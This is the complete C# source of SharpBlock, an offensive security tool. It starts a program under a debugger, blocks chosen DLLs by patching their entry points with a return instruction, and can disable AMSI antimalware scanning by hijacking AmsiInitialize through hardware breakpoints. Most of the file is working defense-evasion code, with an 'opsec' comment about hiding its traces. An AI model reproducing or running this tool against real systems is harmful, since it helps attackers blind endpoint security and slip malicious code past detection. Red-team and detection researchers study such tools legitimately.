using Mono.Options;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using static SharpBlock.WinAPI;

namespace SharpBlock {

    class Program {

        static List<string> blockDllName = new List<string>();
        static List<string> blockDescription = new List<string>();
        static List<string> blockCopyright = new List<string>();
        static List<string> blockProduct = new List<string>();

        static IntPtr amsiInitalizePtr;
 
        private static IntPtr GetIntPtrFromByteArray(byte[] byteArray) {
            GCHandle pinnedArray = GCHandle.Alloc(byteArray, GCHandleType.Pinned);
            IntPtr intPtr = pinnedArray.AddrOfPinnedObject();
            pinnedArray.Free();
            return intPtr;
        }

        private static bool ShouldBlockDLL(string dllPath) {

            // Get the file version for the notepad.
            FileVersionInfo dllVersionInfo = FileVersionInfo.GetVersionInfo(dllPath);
            string dllName = Path.GetFileName(dllPath);

            if (blockDllName.Contains(dllName))
                return true;

            if (dllVersionInfo.FileDescription != null && blockDescription.Contains(dllVersionInfo.FileDescription))
                return true;

            if (dllVersionInfo.ProductName != null && blockProduct.Contains(dllVersionInfo.ProductName))
                return true;

            if (dllVersionInfo.LegalCopyright != null && blockCopyright.Contains(dllVersionInfo.LegalCopyright))
                return true;

            return false;
        }

        static string PatchEntryPointIfNeeded(IntPtr moduleHandle, IntPtr imageBase, IntPtr hProcess) {

            long fileSize;
            StringBuilder dllPath = new StringBuilder(1024);

            if (!WinAPI.GetFileSizeEx(moduleHandle, out fileSize) || fileSize == 0) {
                return null;
            }

            IntPtr handle = WinAPI.CreateFileMapping(moduleHandle, IntPtr.Zero,
                WinAPI.FileMapProtection.PageReadonly | WinAPI.FileMapProtection.SectionImage, 0, 0, null);

            if (handle == IntPtr.Zero) {
                return null;
            }

            IntPtr mem = WinAPI.MapViewOfFile(handle, WinAPI.FileMapAccess.FileMapRead, 0, 0, UIntPtr.Zero);

            if (mem == IntPtr.Zero) {
                return null;
            }

            if (WinAPI.GetFinalPathNameByHandle(moduleHandle, dllPath, (uint)dllPath.Capacity, 0) == 0) { 
                return null;
            }

            dllPath = dllPath.Replace("\\\\?\\", "");

            PE.IMAGE_DOS_HEADER dosHeader = (PE.IMAGE_DOS_HEADER)Marshal.PtrToStructure(mem, typeof(PE.IMAGE_DOS_HEADER));
            PE.IMAGE_FILE_HEADER fileHeader = (PE.IMAGE_FILE_HEADER)Marshal.PtrToStructure( new IntPtr(mem.ToInt64() + dosHeader.e_lfanew) , typeof(PE.IMAGE_FILE_HEADER));

            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            IntPtr entryPoint;
            if ( (fileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE) == IMAGE_FILE_32BIT_MACHINE) {
                PE.IMAGE_OPTIONAL_HEADER32 optionalHeader = (PE.IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure
                    (new IntPtr(mem.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf(typeof(PE.IMAGE_FILE_HEADER))), typeof(PE.IMAGE_OPTIONAL_HEADER32));

                entryPoint = new IntPtr(optionalHeader.AddressOfEntryPoint + imageBase.ToInt32());

            } else {
                PE.IMAGE_OPTIONAL_HEADER64 optionalHeader = (PE.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure
                    (new IntPtr(mem.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf(typeof(PE.IMAGE_FILE_HEADER))), typeof(PE.IMAGE_OPTIONAL_HEADER64));

                entryPoint = new IntPtr(optionalHeader.AddressOfEntryPoint + imageBase.ToInt64());                
            }

            if (ShouldBlockDLL(dllPath.ToString())) {

                Console.WriteLine($"[+] Blocked DLL {dllPath}");

                byte[] retIns = new byte[1] { 0xC3 };
                IntPtr bytesWritten;

                Console.WriteLine("[+] Patching DLL Entry Point at 0x{0:x}", entryPoint.ToInt64());

                if (WinAPI.WriteProcessMemory(hProcess, entryPoint, retIns, 1, out bytesWritten)) {
                    Console.WriteLine("[+] Successfully patched DLL Entry Point");
                } else {
                    Console.WriteLine("[!] Failed patched DLL Entry Point");
                }
            }

            return dllPath.ToString();
        }

        static void DisableAMSI(IntPtr hThread, IntPtr hProcess) {

            Context64 ctx = new Context64(ContextFlags.All);
            ctx.GetContext(hThread);

            //Reads the memory for the current stack pointer to get the return address
            ctx.Ip = ctx.GetCurrentReturnAddress(hProcess);
            //Restore the stack pointer to the prior state before AmsiInitalize was called
            ctx.PopStackPointer();
            //Set the return value register to indicate AMSI is disabled
            ctx.SetResultRegister(0x80070002);

            ctx.SetContext(hThread);   
        }

        static void SetHardwareBreakpoint(IntPtr hThread, IntPtr address) {

            Context64 ctx = new Context64(ContextFlags.Debug);
            ctx.GetContext(hThread);

            if (ctx.Ip != (ulong)address.ToInt64()) {
                ctx.EnableBreakpoint(address);
            } else {
                // If our BP address matches the thread context address
                // then we have hit the HBP, so we need to disable
                // DR0 and enabled single step so that we break at the
                // next instruction and re-eable the HBP.
                ctx.EnableSingleStep();     
            }

            ctx.SetContext(hThread);  
        }

        static void ClearHardwareBreakpoints(IEnumerable<IntPtr> handles) {
            foreach(IntPtr thread in handles) {
                Context64 ctx = new Context64(ContextFlags.Debug);
                ctx.GetContext(thread);
                ctx.ClearBreakpoint();
            }
        }

        static void EnableHardwareBreakpoints(IEnumerable<IntPtr> handles, IntPtr address) {
            foreach (IntPtr thread in handles) {
                Context64 ctx = new Context64(ContextFlags.Debug);
                ctx.GetContext(thread);
                ctx.EnableBreakpoint(address);
            }
        }

        static void Main(string[] args) {

            string program = "c:\\windows\\system32\\cmd.exe";
            string programArgs = "";
            bool showHelp = false;
            bool bypass = false;

            Console.WriteLine(
                 "SharpBlock by @_EthicalChaos_\n" +
                 $"  DLL Blocking app for child processes { (IntPtr.Size == 8 ? "x86_64" : "x86")} \n"
                );

            OptionSet option_set = new OptionSet()
                .Add("e=|exe=", "Program to execute (default cmd.exe)", v => program = v)
                .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
                .Add("n=|name=", "Name of DLL to block", v => blockDllName.Add(v) )
                .Add("c=|copyright=", "Copyright string to block", v => blockCopyright.Add(v))
                .Add("p=|product=", "Product string to block", v => blockProduct.Add(v))
                .Add("d=|description=", "Description string to block", v => blockDescription.Add(v))
                .Add("b=|bypass=", "Bypasses AMSI within the executed process", v => bypass = v != null)
                .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (showHelp) {
                    option_set.WriteOptionDescriptions(Console.Out);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            IntPtr amsiBase = WinAPI.LoadLibrary("amsi.dll");
            amsiInitalizePtr = WinAPI.GetProcAddress(amsiBase, "AmsiInitialize");

            Console.WriteLine($"[+] in-proc AMSI 0x{amsiBase:8x}");

            STARTUPINFO startupInfo =  new STARTUPINFO();
            startupInfo.cb = (uint)Marshal.SizeOf(startupInfo);
            PROCESS_INFORMATION pi =  new PROCESS_INFORMATION();

            if(!CreateProcess(program, $"\"{program}\" {programArgs}", IntPtr.Zero, IntPtr.Zero, true, WinAPI.DEBUG_PROCESS, IntPtr.Zero, null,
                ref startupInfo, out pi)) {
                Console.WriteLine($"[!] Failed to create process {program}");
                return;
            }
          
            Console.WriteLine($"[+] Launched process {program} with PID {pi.dwProcessId}");

            bool bContinueDebugging = true;
            Dictionary<uint, IntPtr> processHandles = new Dictionary<uint, IntPtr>();
            Dictionary<uint, IntPtr> threadHandles = new Dictionary<uint, IntPtr>();

            while (bContinueDebugging) {
                IntPtr debugEventPtr = Marshal.AllocHGlobal(1024);
                bool bb = WinAPI.WaitForDebugEvent(debugEventPtr, 1000);
                UInt32 dwContinueDebugEvent = WinAPI.DBG_CONTINUE;
                if (bb) {
                    WinAPI.DEBUG_EVENT DebugEvent = (WinAPI.DEBUG_EVENT)Marshal.PtrToStructure(debugEventPtr, typeof(WinAPI.DEBUG_EVENT));
                    IntPtr debugInfoPtr = GetIntPtrFromByteArray(DebugEvent.u);
                    switch (DebugEvent.dwDebugEventCode) {
                        case WinAPI.CREATE_PROCESS_DEBUG_EVENT:
                            WinAPI.CREATE_PROCESS_DEBUG_INFO CreateProcessDebugInfo = (WinAPI.CREATE_PROCESS_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.CREATE_PROCESS_DEBUG_INFO));
                            processHandles[DebugEvent.dwProcessId] = CreateProcessDebugInfo.hProcess;
                            threadHandles[DebugEvent.dwThreadId] = CreateProcessDebugInfo.hThread;
                            
                            if(bypass)
                                SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, amsiInitalizePtr);

                            break;
                        case WinAPI.CREATE_THREAD_DEBUG_EVENT:
                            WinAPI.CREATE_THREAD_DEBUG_INFO CreateThreadDebugInfo = (WinAPI.CREATE_THREAD_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.CREATE_THREAD_DEBUG_INFO));
                            threadHandles[DebugEvent.dwThreadId] = CreateThreadDebugInfo.hThread;

                            if (bypass)
                                SetHardwareBreakpoint(CreateThreadDebugInfo.hThread, amsiInitalizePtr);
                            
                            break;
                        case WinAPI.EXIT_PROCESS_DEBUG_EVENT:
                            if (pi.dwProcessId == DebugEvent.dwProcessId) {
                                bContinueDebugging = false;
                            }
                            break;
                        case WinAPI.LOAD_DLL_DEBUG_EVENT:
                            WinAPI.LOAD_DLL_DEBUG_INFO LoadDLLDebugInfo = (WinAPI.LOAD_DLL_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.LOAD_DLL_DEBUG_INFO));
                            string dllPath = PatchEntryPointIfNeeded(LoadDLLDebugInfo.hFile, LoadDLLDebugInfo.lpBaseOfDll, processHandles[DebugEvent.dwProcessId]);
                            break;
                        case WinAPI.EXCEPTION_DEBUG_EVENT:
                            WinAPI.EXCEPTION_DEBUG_INFO ExceptionDebugInfo = (WinAPI.EXCEPTION_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.EXCEPTION_DEBUG_INFO));
                            
                            if (ExceptionDebugInfo.ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP) {
                                
                                //Check to see if the single step breakpoint is at AmsiInitalize
                                if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == amsiInitalizePtr) {
                                    //It is, to update the thread context to return to caller with 
                                    //an invalid result
                                    DisableAMSI(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId]);
                                    //Opsec purposes, lets now clear all threads of hardware breakpoints
                                    ClearHardwareBreakpoints(threadHandles.Values.ToArray());
                                }

                            } else {
                                dwContinueDebugEvent = WinAPI.DBG_EXCEPTION_NOT_HANDLED;
                            }

                            break;
                    }
 
                    WinAPI.ContinueDebugEvent((uint)DebugEvent.dwProcessId,                               
                        (uint)DebugEvent.dwThreadId,
                        dwContinueDebugEvent);
                }
                if (debugEventPtr != null)
                    Marshal.FreeHGlobal(debugEventPtr);
            }

            int exitCode;
            WinAPI.GetExitCodeProcess(pi.hProcess, out exitCode);
            Console.WriteLine($"[+] Process {program} with PID {pi.dwProcessId} exited wit code {exitCode}");
        }
    }
}
